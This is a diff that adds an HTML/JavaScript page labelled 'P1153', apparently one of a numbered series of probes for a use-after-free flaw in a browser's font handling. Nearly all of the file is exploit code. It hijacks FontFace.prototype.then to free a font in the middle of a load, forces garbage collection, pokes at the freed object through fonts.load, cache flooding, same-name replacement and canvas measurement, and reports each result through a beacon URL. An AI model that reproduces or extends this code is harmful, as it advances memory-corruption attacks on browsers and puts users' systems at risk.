@@ -1,0 +1,237 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1153</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body>
+<canvas id="cv" width="400" height="50" style="display:none"></canvas>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1153: CACHE DEEP ACCESS + INVALIDATION ===');
+B('P1153-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var weakFF=null;
+var frFired=false;
+var collectedAt=-1;
+
+// FinalizationRegistry
+var fr=new FinalizationRegistry(function(tag){
+  frFired=true;
+  collectedAt=Date.now();
+  B('P1153-FR','collected|t='+collectedAt);
+});
+
+// Create font
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+weakFF=new WeakRef(ff);
+fr.register(ff,'ff-'+r);
+
+// Thenable rejection pattern (proven in P1151)
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;
+  uafHit=true;
+  var self=this;
+  return function(resolve,reject){
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(self);}catch(e){}
+    document.body.offsetHeight;
+    self=null;
+    reject(new Error('freed'));
+  };
+},set:function(){}});
+
+ff=null;
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+// === Phase 1 (200ms): Immediate state ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!uafHit){B('P1153-DONE','nohit');return;}
+
+  var sz=document.fonts.size;
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err';}
+  B('P1153-P1','sz='+sz+'|check='+chk);
+
+  // Test: does document.fonts.clear() exist?
+  var hasClear=(typeof document.fonts.clear==='function');
+  B('P1153-HAS-CLEAR',''+hasClear);
+},200);
+
+// === GC ROUNDS: Check every 2 seconds, 5 rounds ===
+var gcRound=0;
+function doGCRound(){
+  gcRound++;
+  // Heavy GC pressure
+  var trash=[];
+  for(var g=0;g<2000;g++)trash.push(new ArrayBuffer(2048));
+  trash=null;
+  for(var g=0;g<10000;g++){var tmp=String(g).repeat(80);tmp=null;}
+  for(var g=0;g<5000;g++){var tmp2={a:new Array(100)};tmp2=null;}
+  // Extra round
+  for(var g=0;g<3000;g++){var tmp3=new ArrayBuffer(512);tmp3=null;}
+
+  var wr='?';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+  B('P1153-GC'+gcRound,'wr='+wr+'|fr='+frFired+'|t='+(Date.now()-startT));
+
+  if(wr==='collected'){
+    // WRAPPER IS COLLECTED! Do deep access tests
+    doDeepAccess();
+    return; // stop GC rounds
+  }
+
+  if(gcRound<8){
+    setTimeout(doGCRound, 1500);
+  }else{
+    // Gave up after 8 rounds (12 seconds)
+    B('P1153-GC-FAIL','never collected after 8 rounds');
+    // Still do deep access even without collection
+    doDeepAccess();
+  }
+}
+
+var startT=Date.now();
+setTimeout(doGCRound, 2000);
+
+var deepDone=false;
+function doDeepAccess(){
+  if(deepDone)return;
+  deepDone=true;
+  log('phase','--- Deep access tests ---');
+
+  var wr='?';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+
+  // === TEST A: fonts.check (baseline) ===
+  var chkA='';
+  try{chkA=document.fonts.check('1em y'+r);}catch(e){chkA='ERR:'+e.message.substring(0,30);}
+  B('P1153-A-CHECK','wr='+wr+'|check='+chkA);
+
+  // === TEST B: fonts.load with freed font name ===
+  // This forces DEEP CSSFontFace access — resolves font, creates FontFace wrapper
+  B('P1153-B-PRE','about to fonts.load freed name');
+  try{
+    document.fonts.load('1em y'+r).then(
+      function(arr){
+        B('P1153-B-LOAD','resolved|len='+(arr?arr.length:'?'));
+        // If we got FontFaces back, examine them
+        if(arr&&arr.length>0){
+          for(var i=0;i<arr.length&&i<3;i++){
+            var fam='',stat='',wt='';
+            try{fam=arr[i].family;}catch(e){fam='ERR';}
+            try{stat=arr[i].status;}catch(e){stat='ERR';}
+            try{wt=arr[i].weight;}catch(e){wt='ERR';}
+            B('P1153-B-FF'+i,'family='+fam+'|status='+stat+'|weight='+wt);
+          }
+        }
+      },
+      function(e){B('P1153-B-LOAD','rejected|msg='+(e?e.message:'?'));}
+    );
+  }catch(e){B('P1153-B-LOAD','threw|msg='+e.message.substring(0,40));}
+
+  // === TEST C: Cache invalidation attempts ===
+  log('phase','--- Cache invalidation ---');
+
+  // C1: Add and remove a dummy @font-face
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:dummy"+r+";src:local(serif)}";
+  document.head.appendChild(st2);
+  document.body.offsetHeight; // force recalc
+  st2.remove();
+  document.body.offsetHeight;
+  var chkC1='';
+  try{chkC1=document.fonts.check('1em y'+r);}catch(e){chkC1='err';}
+  B('P1153-C1-INVALIDATE','check='+chkC1);
+
+  // C2: Add 50 @font-face rules to flood the cache
+  var stFlood=document.createElement('style');
+  var rules='';
+  for(var k=0;k<50;k++){
+    rules+="@font-face{font-family:flood"+r+"x"+k+";src:local(Arial)}";
+  }
+  stFlood.textContent=rules;
+  document.head.appendChild(stFlood);
+  document.body.offsetHeight;
+  var chkC2='';
+  try{chkC2=document.fonts.check('1em y'+r);}catch(e){chkC2='err';}
+  B('P1153-C2-FLOOD','check='+chkC2);
+  stFlood.remove();
+  document.body.offsetHeight;
+
+  // C3: Try document.fonts.clear() if it exists
+  var clearResult='no_method';
+  try{
+    if(typeof document.fonts.clear==='function'){
+      document.fonts.clear();
+      clearResult='called';
+    }
+  }catch(e){clearResult='ERR:'+e.message.substring(0,30);}
+  var chkC3='';
+  try{chkC3=document.fonts.check('1em y'+r);}catch(e){chkC3='err';}
+  B('P1153-C3-CLEAR','result='+clearResult+'|check='+chkC3);
+
+  // C4: Navigate to about:blank and back (force full page state reset)
+  // Can't do this without losing the script. Instead, create an iframe
+  var ifr=document.createElement('iframe');
+  ifr.style.display='none';
+  document.body.appendChild(ifr);
+  var chkC4='';
+  try{chkC4=document.fonts.check('1em y'+r);}catch(e){chkC4='err';}
+  B('P1153-C4-IFRAME','check='+chkC4);
+  ifr.remove();
+
+  // === TEST D: Create new FontFace with SAME family name ===
+  log('phase','--- Same-name FontFace replacement ---');
+  var ff2=null;
+  try{
+    ff2=new FontFace('y'+r,'local(Courier)',{weight:'700',style:'italic'});
+    document.fonts.add(ff2);
+  }catch(e){B('P1153-D-ERR',e.message);}
+
+  // Now check: does fonts.check resolve to old or new?
+  var chkD='';
+  try{chkD=document.fonts.check('700 italic 1em y'+r);}catch(e){chkD='err';}
+  var chkD2='';
+  try{chkD2=document.fonts.check('1em y'+r);}catch(e){chkD2='err';}
+  B('P1153-D-REPLACE','checkBold='+chkD+'|checkNormal='+chkD2+'|fontsSize='+document.fonts.size);
+
+  // Read new FontFace properties
+  if(ff2){
+    var fam2='',stat2='',wt2='';
+    try{fam2=ff2.family;}catch(e){fam2='ERR';}
+    try{stat2=ff2.status;}catch(e){stat2='ERR';}
+    try{wt2=ff2.weight;}catch(e){wt2='ERR';}
+    B('P1153-D-NEW','family='+fam2+'|status='+stat2+'|weight='+wt2);
+  }
+
+  // === TEST E: Canvas measureText - freed vs replacement ===
+  var cv=document.getElementById('cv');
+  var ctx=cv.getContext('2d');
+  ctx.font='16px monospace';
+  var wMono=ctx.measureText('XXXXXXXXXX').width;
+  ctx.font='16px "y'+r+'", monospace';
+  var wY=ctx.measureText('XXXXXXXXXX').width;
+  ctx.font='700 italic 16px "y'+r+'", monospace';
+  var wYBold=ctx.measureText('XXXXXXXXXX').width;
+  ctx.font='16px Courier, monospace';
+  var wCourier=ctx.measureText('XXXXXXXXXX').width;
+  B('P1153-E-MEASURE','mono='+wMono+'|y='+wY+'|yBold='+wYBold+'|courier='+wCourier);
+
+  // === SUMMARY ===
+  setTimeout(function(){
+    var sum='wr='+wr+'|fr='+frFired+'|chkA='+chkA+'|c1='+chkC1+
+      '|c2='+chkC2+'|c3='+chkC3+'|c4='+chkC4+'|dBold='+chkD+'|dNorm='+chkD2;
+    B('P1153-SUMMARY',sum);
+    B('P1153-DONE','complete');
+  },1000);
+}
+</script></body></html>
